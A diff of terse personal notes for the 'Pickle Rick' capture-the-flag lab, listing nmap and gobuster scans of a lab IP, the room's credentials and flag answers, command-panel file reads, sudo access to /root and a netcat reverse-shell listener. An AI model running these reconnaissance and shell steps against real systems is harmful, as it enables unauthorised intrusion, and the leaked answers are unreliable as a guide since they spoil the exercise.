@@ -30,8 +30,39 @@ Pickle Rick
 sudo apt install nmap
 nmap -v
 
-sudo nmap sionoo.com -A -T 4 -v -oN scan_results
+sudo nmap 10.10.144.156 -A -T 4 -v -oN scan_results
 nano scan_results
+
+navigate to http://10.10.144.156
+sudo find / -name 'directory-list-2.3-medium.txt'
+gobuster dir -u http://10.10.144.156/ -x php,html,css,js,txt,pdf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+R1ckRul3s
+Wubbalubbadubdub
+
+On command panel
+ls -a
+
+http://10.10.144.156/Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+
+cat clue.txt
+tac clue.txt
+
+ls -al /home
+ls -al /home/rick
+tac /home/rick/second\ ingredients
+1 jerry tear
+sudo ls -al /root
+sudo tac /root/3rd.txt
+
+which python3
+/usr/bin/python3
+
+nc -lvnp 1234
+
+whoami
+www-data
 
 Crack the hash guide
 https://j-info.github.io/ctfsite/walkthroughs/2022-01-21-Crack-the-hash.html
